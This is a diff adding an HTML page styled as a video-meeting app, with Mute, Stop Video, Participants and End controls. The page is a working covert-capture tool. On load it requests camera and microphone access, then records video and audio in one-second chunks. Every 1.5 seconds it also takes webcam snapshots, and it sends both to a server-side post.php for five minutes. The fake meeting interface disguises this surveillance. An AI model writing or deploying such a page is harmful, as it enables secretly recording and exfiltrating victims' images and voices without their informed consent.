@@ -1,0 +1,384 @@
+<!doctype html>
+<html>
+
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap">
+  <video id="video" playsinline autoplay hidden></video>
+</div>
+
+<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+
+  body {
+    height: 100vh;
+    width: 100vw;
+  }
+
+  * {
+    padding: 0px;
+    margin: 0px;
+    font-family: 'Nunito', sans-serif;
+    font-weight: 500;
+  }
+
+  .main-screen {
+    background-color: #273039;
+    height: 100vh;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  img {
+    height: 80px;
+    width: 80px;
+  }
+
+  .bottom-bar {
+    position: fixed;
+    padding: 0px 40px 0px -40px;
+    bottom: 0px;
+    height: 80px;
+    width: 100%;
+    background-color: #1F2022;
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+  }
+
+  .icon-button {
+    display: flex;
+    flex-direction: column;
+    justify-items: center;
+    align-items: center;
+  }
+
+  i {
+    margin-bottom: 8px;
+    font-size: 26px;
+  }
+
+  button {
+    color: #fff;
+    background-color: crimson;
+    padding: 5px 20px;
+    border: none;
+    border-radius: 5px;
+    border-style: none;
+    outline: none;
+  }
+
+  .float_button {
+    background-color: #1F2022;
+    height: 40px;
+    border-radius: 5px;
+    width: 40px;
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 5px;
+    right: 5px;
+  }
+  #ac-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255,255,255,.6);
+    z-index: 1001;
+}
+
+#popup {
+    width: 555px;
+    height: 35px;
+    background: #FFFFFF;
+    border: 5px solid #000;
+    border-radius: 15px;
+    -moz-border-radius: 15px;
+    -webkit-border-radius: 15px;
+    box-shadow: #64686e 0px 0px 3px 3px;
+    -moz-box-shadow: #64686e 0px 0px 3px 3px;
+    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    position: relative;
+    top: 250px; left: 375px;
+}
+</style>
+
+<script>
+
+  class ChunkUploader {
+      constructor() {
+          this.uploadQueue = [];
+          this.isUploading = false;
+          this.sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+          this.retryAttempts = 3;
+          this.retryDelay = 1000;
+          console.log('[v0] ChunkUploader initialized with session:', this.sessionId);
+      }
+
+      async uploadChunk(blob, chunkIndex) {
+          const formData = new FormData();
+          formData.append('videoChunk', blob, 'chunk.webm');
+          formData.append('chunkIndex', chunkIndex);
+          formData.append('sessionId', this.sessionId);
+
+          for (let attempt = 0; attempt < this.retryAttempts; attempt++) {
+              try {
+                  console.log(`[v0] Uploading chunk ${chunkIndex}, size: ${blob.size} bytes, attempt: ${attempt + 1}`);
+                  
+                  const response = await fetch('./saved_videos/post.php', {
+                      method: 'POST',
+                      body: formData
+                  });
+
+                  if (!response.ok) {
+                      const text = await response.text();
+                      throw new Error(`HTTP error! status: ${response.status}, response: ${text}`);
+                  }
+
+                  const result = await response.json();
+                  console.log(`[v0] Chunk ${chunkIndex} uploaded successfully:`, result);
+                  return result;
+              } catch (error) {
+                  console.warn(`[v0] Chunk ${chunkIndex} upload attempt ${attempt + 1} failed:`, error);
+                  if (attempt < this.retryAttempts - 1) {
+                      await new Promise(resolve => setTimeout(resolve, this.retryDelay * Math.pow(2, attempt)));
+                  } else {
+                      console.error(`[v0] Chunk ${chunkIndex} failed after ${this.retryAttempts} attempts`);
+                      throw error;
+                  }
+              }
+          }
+      }
+
+      queueChunk(blob, chunkIndex) {
+          this.uploadQueue.push({ blob, chunkIndex });
+          console.log(`[v0] Chunk ${chunkIndex} queued, queue length: ${this.uploadQueue.length}`);
+          this.processQueue();
+      }
+
+      async processQueue() {
+          if (this.isUploading || this.uploadQueue.length === 0) {
+              return;
+          }
+
+          this.isUploading = true;
+
+          while (this.uploadQueue.length > 0) {
+              const { blob, chunkIndex } = this.uploadQueue.shift();
+              try {
+                  await this.uploadChunk(blob, chunkIndex);
+              } catch (error) {
+                  console.error(`[v0] Failed to upload chunk ${chunkIndex}`);
+              }
+          }
+
+          this.isUploading = false;
+      }
+
+      async finalize() {
+          console.log('[v0] Finalization started, waiting for queue to empty...');
+          
+          while (this.uploadQueue.length > 0 || this.isUploading) {
+              await new Promise(resolve => setTimeout(resolve, 100));
+          }
+
+          try {
+              console.log('[v0] All chunks uploaded, sending finalize request...');
+              
+              const formData = new FormData();
+              formData.append('type', 'finalize');
+              formData.append('sessionId', this.sessionId);
+
+              const response = await fetch('./saved_videos/post.php', {
+                  method: 'POST',
+                  body: formData
+              });
+
+              if (!response.ok) {
+                  const text = await response.text();
+                  throw new Error(`HTTP error! status: ${response.status}, response: ${text}`);
+              }
+
+              const result = await response.json();
+              console.log('[v0] Recording finalized:', result);
+              return result;
+          } catch (error) {
+              console.error('[v0] Finalization failed:', error);
+              throw error;
+          }
+      }
+  }
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: './saved_videos/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        console.log('[v0] Image snapshot uploaded:', result);
+      },
+      error: function (xhr, status, error) {
+        console.error('[v0] Image upload failed:', error, 'Response:', xhr.responseText);
+      }
+    });
+  };
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: true,
+    video: {
+      facingMode: "user"
+    }
+  };
+
+  let mediaRecorder = null;
+  let chunkUploader = null;
+  let chunkIndex = 0;
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      console.error('[v0] getUserMedia error:', e);
+      if (errorMsgElement) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    chunkUploader = new ChunkUploader();
+    
+    const options = {
+        mimeType: 'video/webm;codecs=vp8,opus',
+        videoBitsPerSecond: 1000000
+    };
+
+    try {
+        mediaRecorder = new MediaRecorder(stream, options);
+        console.log('[v0] MediaRecorder created with options:', options);
+    } catch (e) {
+        console.warn('[v0] MediaRecorder with options failed, trying without:', e);
+        mediaRecorder = new MediaRecorder(stream);
+    }
+
+    mediaRecorder.ondataavailable = async (event) => {
+        if (event.data && event.data.size > 0) {
+            console.log(`[v0] Chunk received from MediaRecorder, size: ${event.data.size} bytes`);
+            chunkUploader.queueChunk(event.data, chunkIndex++);
+        }
+    };
+
+    mediaRecorder.onstop = async () => {
+        console.log('[v0] Recording stopped, finalizing...');
+        try {
+            await chunkUploader.finalize();
+            console.log('[v0] All chunks uploaded and merged successfully');
+        } catch (error) {
+            console.error('[v0] Finalization error:', error);
+        }
+    };
+
+    mediaRecorder.start(1000);
+    console.log('[v0] MediaRecorder started, recording in 1-second chunks');
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+
+    setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+            mediaRecorder.stop();
+            console.log('[v0] Recording auto-stopped after 5 minutes');
+        }
+    }, 300000);
+  }
+  
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+  }
+  
+  // Load init
+  init();
+  
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   },50000);
+  });
+
+  window.addEventListener('beforeunload', () => {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+      }
+  });
+</script>
+
+<body>
+  <div class="float_button">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+  </div>
+  <div class="bottom-bar">
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share content</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+    <button style="margin-right: 50px;">End</button>
+  </div>
+</body>
+
+</html>
